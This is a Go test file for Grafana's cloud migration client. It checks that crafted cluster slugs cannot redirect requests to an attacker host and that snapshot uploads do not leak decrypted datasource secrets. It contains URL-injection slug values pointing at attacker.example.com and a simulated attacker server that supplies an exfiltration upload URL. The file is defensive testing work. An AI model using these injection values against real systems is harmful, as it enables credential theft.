package cloudmigrationimpl

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"mime"
	"mime/multipart"
	"net"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	snapshot "github.com/grafana/grafana-cloud-migration-snapshot/src"
	"github.com/grafana/grafana-cloud-migration-snapshot/src/contracts"
	"github.com/grafana/grafana-cloud-migration-snapshot/src/infra/crypto"
	"github.com/stretchr/testify/require"

	"github.com/grafana/grafana/pkg/infra/kvstore"
	"github.com/grafana/grafana/pkg/infra/log"
	"github.com/grafana/grafana/pkg/infra/tracing"
	"github.com/grafana/grafana/pkg/services/cloudmigration"
	"github.com/grafana/grafana/pkg/services/cloudmigration/gmsclient"
	"github.com/grafana/grafana/pkg/services/cloudmigration/objectstorage"
	"github.com/grafana/grafana/pkg/services/datasources"
	datafakes "github.com/grafana/grafana/pkg/services/datasources/fakes"
	"github.com/grafana/grafana/pkg/services/folder/foldertest"
	secretsfakes "github.com/grafana/grafana/pkg/services/secrets/fakes"
	"github.com/grafana/grafana/pkg/services/user"
	"github.com/grafana/grafana/pkg/setting"
)

// placeholderDatasourceSecret is an obvious stand-in for a decrypted datasource
// secret. It is not a credential.
const placeholderDatasourceSecret = "placeholder-datasource-secret"

// placeholderMigrationToken is an obvious stand-in for the token string carried
// inside a migration token. It is not a credential.
const placeholderMigrationToken = "placeholder-migration-token"

const (
	migrationDomain       = "grafana.net"
	attackerGMSHost       = "attacker.example.com"
	attackerUploadHost    = "uploads.example.com"
	validClusterSlug      = "prod-us-central-0"
	validValidationStatus = "ok"
)

func TestCraftedClusterSlugDoesNotDialOutsideMigrationDomain(t *testing.T) {
	slugs := []string{
		"x@" + attackerGMSHost + "#",
		"x@" + attackerGMSHost + "?",
		"prod." + attackerGMSHost + "#",
	}

	for _, slug := range slugs {
		t.Run(slug, func(t *testing.T) {
			keys, err := crypto.NewNacl().GenerateKeys()
			require.NoError(t, err)
			server, client, dials := newLocalMigrationServer(t, attackerHandler(t, keys, nil))
			defer server.Close()

			gms := newTestGMSClient(t, migrationDomain, client)
			session := cloudmigration.CloudMigrationSession{
				OrgID:       1,
				StackID:     42,
				AuthToken:   placeholderMigrationToken,
				ClusterSlug: slug,
				Slug:        "stack-slug",
				RegionSlug:  "prod-us-east-0",
			}
			ctx := context.Background()

			t.Run("validate key", func(t *testing.T) {
				dials.reset()
				err := gms.ValidateKey(ctx, session)
				requireNoAttackerDial(t, dials)
				require.Error(t, err)
			})

			t.Run("start snapshot", func(t *testing.T) {
				dials.reset()
				_, err := gms.StartSnapshot(ctx, session, cloudmigration.EncryptionAlgoNacl)
				requireNoAttackerDial(t, dials)
				require.Error(t, err)
			})

			t.Run("snapshot status", func(t *testing.T) {
				dials.reset()
				_, err := gms.GetSnapshotStatus(ctx, session, cloudmigration.CloudMigrationSnapshot{
					UID:            "snapshot-uid",
					GMSSnapshotUID: "gms-snapshot-uid",
				}, 0)
				requireNoAttackerDial(t, dials)
				require.Error(t, err)
			})

			t.Run("create upload url", func(t *testing.T) {
				dials.reset()
				_, err := gms.CreatePresignedUploadUrl(ctx, session, cloudmigration.CloudMigrationSnapshot{
					UID:            "snapshot-uid",
					GMSSnapshotUID: "gms-snapshot-uid",
				})
				requireNoAttackerDial(t, dials)
				require.Error(t, err)
			})

			t.Run("report event", func(t *testing.T) {
				dials.reset()
				gms.ReportEvent(ctx, session, gmsclient.EventRequestDTO{
					LocalID: "local-id",
					Event:   gmsclient.EventConnect,
				})
				requireNoAttackerDial(t, dials)
			})

			t.Run("create session", func(t *testing.T) {
				dials.reset()
				store := newMemStore()
				svc := newTestMigrationService(t, gms, client, store)
				_, err := svc.CreateSession(ctx, &user.SignedInUser{
					UserID:  1,
					OrgID:   1,
					UserUID: "user-uid",
					Login:   "admin",
				}, cloudmigration.CloudMigrationSessionRequest{
					AuthToken: encodeMigrationToken(t, slug),
					OrgID:     1,
				})
				requireNoAttackerDial(t, dials)
				require.Error(t, err)
				require.Empty(t, store.sessions)
			})
		})
	}
}

func TestValidClusterSlugDialsConfiguredMigrationDomain(t *testing.T) {
	keys, err := crypto.NewNacl().GenerateKeys()
	require.NoError(t, err)
	server, client, dials := newLocalMigrationServer(t, attackerHandler(t, keys, nil))
	defer server.Close()

	gms := newTestGMSClient(t, migrationDomain, client)
	err = gms.ValidateKey(context.Background(), cloudmigration.CloudMigrationSession{
		StackID:     42,
		AuthToken:   placeholderMigrationToken,
		ClusterSlug: validClusterSlug,
	})
	require.Error(t, err)
	require.Equal(t, []string{"cms-" + validClusterSlug + "." + migrationDomain + ":443"}, dials.snapshot())
}

func TestValidateKeyRejectsHTTP200WithoutValidDocument(t *testing.T) {
	cases := []struct {
		name string
		body string
		ok   bool
	}{
		{name: "empty body", body: "", ok: false},
		{name: "plain text", body: "ok", ok: false},
		{name: "wrong status", body: `{"status":"error"}`, ok: false},
		{name: "missing status", body: `{"uploadUrl":"https://uploads.example.com/collect"}`, ok: false},
		{name: "valid document", body: `{"status":"ok"}`, ok: true},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				w.WriteHeader(http.StatusOK)
				_, _ = io.WriteString(w, tc.body)
			}))
			t.Cleanup(server.Close)

			gms := newTestGMSClient(t, "example.com", server.Client())
			err := gms.ValidateKey(context.Background(), cloudmigration.CloudMigrationSession{
				StackID:     42,
				AuthToken:   placeholderMigrationToken,
				ClusterSlug: validClusterSlug,
			})
			if tc.ok {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
		})
	}
}

func TestSnapshotUploadDoesNotDeliverDecryptedDatasourceSecrets(t *testing.T) {
	attackerKeys, err := crypto.NewNacl().GenerateKeys()
	require.NoError(t, err)
	require.Len(t, attackerKeys.Public, 32)
	require.Len(t, attackerKeys.Private, 32)

	var requests []recordedRequest
	server, client, dials := newLocalMigrationServer(t, attackerHandler(t, attackerKeys, &requests))
	defer server.Close()

	gms := newTestGMSClient(t, migrationDomain, client)
	store := newMemStore()
	svc := newTestMigrationService(t, gms, client, store)
	ctx := context.Background()
	admin := &user.SignedInUser{UserID: 1, OrgID: 1, UserUID: "user-uid", Login: "admin"}

	svc.folderService = foldertest.NewFakeService()
	svc.dsService = &datafakes.FakeDataSourceService{
		DataSources: []*datasources.DataSource{{
			OrgID:    admin.OrgID,
			UID:      "datasource-uid",
			Name:     "mysql",
			Type:     "mysql",
			Access:   datasources.DS_ACCESS_PROXY,
			URL:      "127.0.0.1:3306",
			JsonData: nil,
			SecureJsonData: map[string][]byte{
				"password": []byte(placeholderDatasourceSecret),
			},
		}},
	}

	slug := "x@" + attackerGMSHost + "#"
	_, sessionErr := svc.CreateSession(ctx, admin, cloudmigration.CloudMigrationSessionRequest{
		AuthToken: encodeMigrationToken(t, slug),
		OrgID:     admin.OrgID,
	})

	session := cloudmigration.CloudMigrationSession{
		OrgID:       admin.OrgID,
		UID:         "session-uid",
		StackID:     42,
		AuthToken:   placeholderMigrationToken,
		ClusterSlug: slug,
		Slug:        "stack-slug",
		RegionSlug:  "prod-us-east-0",
	}
	startResp, startErr := gms.StartSnapshot(ctx, session, cloudmigration.EncryptionAlgoNacl)
	publicKey := attackerKeys.Public
	if startErr == nil && startResp != nil && len(startResp.GMSPublicKey) > 0 {
		require.Equal(t, attackerKeys.Public, startResp.GMSPublicKey)
		publicKey = startResp.GMSPublicKey
	}

	const snapshotUID = "snapshot-uid"
	store.snapshots[snapshotUID] = &cloudmigration.CloudMigrationSnapshot{
		UID:            snapshotUID,
		SessionUID:     session.UID,
		GMSSnapshotUID: "gms-snapshot-uid",
		EncryptionAlgo: string(cloudmigration.EncryptionAlgoNacl),
		Metadata:       []byte("metadata"),
		GMSPublicKey:   publicKey,
	}
	buildErr := svc.buildSnapshot(ctx, admin, 10, []byte("metadata"), cloudmigration.CloudMigrationSnapshot{
		UID:            snapshotUID,
		SessionUID:     session.UID,
		GMSSnapshotUID: "gms-snapshot-uid",
		GMSPublicKey:   publicKey,
		Metadata:       []byte("metadata"),
		EncryptionAlgo: string(cloudmigration.EncryptionAlgoNacl),
	}, cloudmigration.ResourceTypes{cloudmigration.DatasourceDataType: {}}, string(cloudmigration.EncryptionAlgoNacl))
	require.NoError(t, buildErr)

	uploadURL, uploadURLErr := gms.CreatePresignedUploadUrl(ctx, session, cloudmigration.CloudMigrationSnapshot{
		UID:            snapshotUID,
		SessionUID:     session.UID,
		GMSSnapshotUID: "gms-snapshot-uid",
	})
	if uploadURLErr != nil {
		uploadURL = "https://" + attackerUploadHost + "/collect"
	}
	uploadErr := svc.uploadSnapshot(ctx, &session, store.snapshots[snapshotUID], uploadURL)

	files := uploadedFiles(t, requests)
	reader := snapshot.NewSnapshotReader(contracts.AssymetricKeys{
		Public:  store.snapshots[snapshotUID].PublicKey,
		Private: attackerKeys.Private,
	}, crypto.NewNacl())
	for _, file := range files {
		part, readErr := reader.ReadFile(bytes.NewReader(file))
		if readErr != nil {
			continue
		}
		raw, marshalErr := json.Marshal(part.Items)
		require.NoError(t, marshalErr)
		require.NotContains(t, string(raw), placeholderDatasourceSecret)
	}

	require.Empty(t, files)
	require.Error(t, sessionErr)
	require.Error(t, startErr)
	require.Error(t, uploadURLErr)
	require.Error(t, uploadErr)
	requireNoAttackerDial(t, dials)
	require.Empty(t, store.sessions)
}

func requireNoAttackerDial(t *testing.T, dials *dialLog) {
	t.Helper()
	for _, addr := range dials.snapshot() {
		host, _, err := net.SplitHostPort(addr)
		require.NoError(t, err)
		require.Falsef(t, hostOutsideMigrationDomain(host), "dialed %s", addr)
	}
	require.Empty(t, dials.snapshot())
}

func hostOutsideMigrationDomain(host string) bool {
	expectedSuffix := "." + migrationDomain
	return host == attackerGMSHost || host == attackerUploadHost || !strings.HasSuffix(host, expectedSuffix)
}

type dialLog struct {
	mu    sync.Mutex
	addrs []string
}

func (d *dialLog) add(addr string) {
	d.mu.Lock()
	d.addrs = append(d.addrs, addr)
	d.mu.Unlock()
}

func (d *dialLog) reset() {
	d.mu.Lock()
	d.addrs = nil
	d.mu.Unlock()
}

func (d *dialLog) snapshot() []string {
	d.mu.Lock()
	defer d.mu.Unlock()
	out := make([]string, len(d.addrs))
	copy(out, d.addrs)
	return out
}

type recordedRequest struct {
	host        string
	contentType string
	body        []byte
}

func newLocalMigrationServer(t *testing.T, handler http.Handler) (*httptest.Server, *http.Client, *dialLog) {
	t.Helper()
	server := httptest.NewTLSServer(handler)
	client := server.Client()
	transport, ok := client.Transport.(*http.Transport)
	require.True(t, ok)
	baseDial := transport.DialContext
	dials := &dialLog{}
	transport.DialContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
		dials.add(addr)
		host, _, err := net.SplitHostPort(addr)
		if err != nil {
			return nil, err
		}
		// example.com is the certificate name served by httptest.Server.
		// Redirecting it models an attacker-controlled DNS name with a
		// certificate the client trusts. Every other host is refused here
		// so the test does not open a connection to the configured domain.
		if host == "example.com" || strings.HasSuffix(host, ".example.com") {
			return baseDial(ctx, network, addr)
		}
		return nil, fmt.Errorf("blocked dial %s", addr)
	}
	return server, client, dials
}

func attackerHandler(t *testing.T, keys contracts.AssymetricKeys, requests *[]recordedRequest) http.Handler {
	t.Helper()
	payload, err := json.Marshal(map[string]any{
		"status":               validValidationStatus,
		"snapshotID":           "gms-snapshot-uid",
		"maxItemsPerPartition": 10,
		"algo":                 string(cloudmigration.EncryptionAlgoNacl),
		"encryptionKey":        keys.Public,
		"metadata":             []byte("metadata"),
		"uploadUrl":            "https://" + attackerUploadHost + "/collect",
		"state":                string(cloudmigration.SnapshotStateInitialized),
		"results":              []any{},
	})
	require.NoError(t, err)

	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, readErr := io.ReadAll(r.Body)
		if readErr != nil {
			http.Error(w, readErr.Error(), http.StatusBadRequest)
			return
		}
		if requests != nil {
			*requests = append(*requests, recordedRequest{
				host:        r.Host,
				contentType: r.Header.Get("Content-Type"),
				body:        body,
			})
		}
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		_, _ = w.Write(payload)
	})
}

func uploadedFiles(t *testing.T, requests []recordedRequest) [][]byte {
	t.Helper()
	var files [][]byte
	for _, req := range requests {
		mediaType, params, err := mime.ParseMediaType(req.contentType)
		if err != nil || !strings.HasPrefix(mediaType, "multipart/") {
			continue
		}
		reader := multipart.NewReader(bytes.NewReader(req.body), params["boundary"])
		for {
			part, err := reader.NextPart()
			if errors.Is(err, io.EOF) {
				break
			}
			require.NoError(t, err)
			contents, err := io.ReadAll(part)
			require.NoError(t, err)
			if part.FormName() == "file" {
				files = append(files, contents)
			}
		}
	}
	return files
}

func encodeMigrationToken(t *testing.T, clusterSlug string) string {
	t.Helper()
	raw, err := json.Marshal(cloudmigration.Base64EncodedTokenPayload{
		Token: placeholderMigrationToken,
		Instance: cloudmigration.Base64HGInstance{
			StackID:     42,
			Slug:        "stack-slug",
			RegionSlug:  "prod-us-east-0",
			ClusterSlug: clusterSlug,
		},
	})
	require.NoError(t, err)
	return base64.StdEncoding.EncodeToString(raw)
}

func newTestGMSClient(t *testing.T, domain string, httpClient *http.Client) gmsclient.Client {
	t.Helper()
	client, err := gmsclient.NewGMSClient(testMigrationConfig(domain), httpClient)
	require.NoError(t, err)
	return client
}

func newTestMigrationService(t *testing.T, gms gmsclient.Client, httpClient *http.Client, store store) *Service {
	t.Helper()
	tracer := tracing.InitializeTracerForTest()
	return &Service{
		store:          store,
		log:            log.New("cloudmigration.test"),
		cfg:            testMigrationConfig(migrationDomain),
		gmsClient:      gms,
		objectStorage:  objectstorage.NewS3(httpClient, tracer),
		secretsService: secretsfakes.NewFakeSecretsService(),
		kvStore:        kvstore.WithNamespace(kvstore.NewFakeKVStore(), 0, "cloudmigration"),
		tracer:         tracer,
	}
}

func testMigrationConfig(domain string) *setting.Cfg {
	return &setting.Cfg{
		CloudMigration: setting.CloudMigrationSettings{
			GMSDomain:                   domain,
			ResourceStorageType:         cloudmigration.ResourceStorageTypeDb,
			EncryptionAlgo:              string(cloudmigration.EncryptionAlgoNacl),
			GMSValidateKeyTimeout:       5 * time.Second,
			GMSStartSnapshotTimeout:     5 * time.Second,
			GMSGetSnapshotStatusTimeout: 5 * time.Second,
			GMSCreateUploadUrlTimeout:   5 * time.Second,
			GMSReportEventTimeout:       5 * time.Second,
		},
	}
}

type memStore struct {
	sessions  []*cloudmigration.CloudMigrationSession
	snapshots map[string]*cloudmigration.CloudMigrationSnapshot
	parts     map[string]cloudmigration.CloudMigrationSnapshotPartition
}

func newMemStore() *memStore {
	return &memStore{
		snapshots: map[string]*cloudmigration.CloudMigrationSnapshot{},
		parts:     map[string]cloudmigration.CloudMigrationSnapshotPartition{},
	}
}

func (m *memStore) CreateMigrationSession(_ context.Context, session cloudmigration.CloudMigrationSession) (*cloudmigration.CloudMigrationSession, error) {
	session.UID = "session-uid"
	m.sessions = append(m.sessions, &session)
	return &session, nil
}

func (m *memStore) GetMigrationSessionByUID(context.Context, int64, string) (*cloudmigration.CloudMigrationSession, error) {
	return nil, errors.New("not used")
}

func (m *memStore) GetCloudMigrationSessionList(context.Context, int64) ([]*cloudmigration.CloudMigrationSession, error) {
	return nil, errors.New("not used")
}

func (m *memStore) DeleteMigrationSessionByUID(context.Context, int64, string) (*cloudmigration.CloudMigrationSession, []cloudmigration.CloudMigrationSnapshot, error) {
	return nil, nil, errors.New("not used")
}

func (m *memStore) CreateSnapshot(context.Context, cloudmigration.CloudMigrationSnapshot) error {
	return errors.New("not used")
}

func (m *memStore) UpdateSnapshot(_ context.Context, cmd cloudmigration.UpdateSnapshotCmd) error {
	snap := m.snapshots[cmd.UID]
	if snap == nil {
		return errors.New("snapshot not found")
	}
	snap.Status = cmd.Status
	if len(cmd.PublicKey) > 0 {
		snap.PublicKey = cmd.PublicKey
	}
	return nil
}

func (m *memStore) GetIndex(_ context.Context, _ int64, _ string, snapshotUID string) (cloudmigration.CloudMigrationSnapshotIndex, error) {
	snap := m.snapshots[snapshotUID]
	if snap == nil {
		return cloudmigration.CloudMigrationSnapshotIndex{}, errors.New("snapshot not found")
	}
	items := map[string][]int{}
	for _, part := range m.parts {
		if part.SnapshotUID == snapshotUID {
			items[part.ResourceType] = append(items[part.ResourceType], part.PartitionNumber)
		}
	}
	return cloudmigration.CloudMigrationSnapshotIndex{
		EncryptionAlgo: snap.EncryptionAlgo,
		PublicKey:      snap.PublicKey,
		Metadata:       snap.Metadata,
		Items:          items,
	}, nil
}

func (m *memStore) GetPartition(_ context.Context, snapshotUID string, resourceType string, partitionNumber int) (cloudmigration.CloudMigrationSnapshotPartition, error) {
	part, ok := m.parts[partitionKey(snapshotUID, resourceType, partitionNumber)]
	if !ok {
		return cloudmigration.CloudMigrationSnapshotPartition{}, errors.New("partition not found")
	}
	return part, nil
}

func (m *memStore) StorePartition(_ context.Context, snapshotUID string, resourceType string, partitionNumber int, data []byte) error {
	m.parts[partitionKey(snapshotUID, resourceType, partitionNumber)] = cloudmigration.CloudMigrationSnapshotPartition{
		SnapshotUID:     snapshotUID,
		ResourceType:    resourceType,
		PartitionNumber: partitionNumber,
		Data:            data,
	}
	return nil
}

func (m *memStore) GetSnapshotByUID(context.Context, int64, string, string, cloudmigration.SnapshotResultQueryParams) (*cloudmigration.CloudMigrationSnapshot, error) {
	return nil, errors.New("not used")
}

func (m *memStore) GetSnapshotList(context.Context, cloudmigration.ListSnapshotsQuery) ([]cloudmigration.CloudMigrationSnapshot, error) {
	return nil, errors.New("not used")
}

func partitionKey(snapshotUID, resourceType string, partitionNumber int) string {
	return fmt.Sprintf("%s|%s|%d", snapshotUID, resourceType, partitionNumber)
}

var _ store = (*memStore)(nil)
